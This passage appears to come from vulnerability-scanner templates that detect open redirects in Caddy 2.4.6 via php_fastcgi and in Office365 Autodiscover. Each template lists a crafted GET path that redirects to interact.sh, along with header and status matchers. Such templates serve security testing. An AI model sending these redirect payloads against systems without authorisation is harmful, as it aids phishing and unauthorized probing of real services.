- Caddy 2.4.6 contains an open redirect vulnerability via php_fastcgi. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect,caddy,server

## Requests

- Method - GET

### URL

- {{BaseURL}}//interact.sh/%2F..

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Office365 Autodiscover - Open Redirect

## Description

- Office365 Autodiscover contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - redirect,office365,microsoft

## Requests

- Method - GET

### URL

- {{BaseURL}}/autodiscover/autodiscover.json/v1.0/{{randstr}}@interact.sh?Protocol=Autodiscoverv1

### Matchers

**Type - word**

- part - header
- words
  1. autodiscover.interact.sh

**Type - status**

- status
  1. 302

---
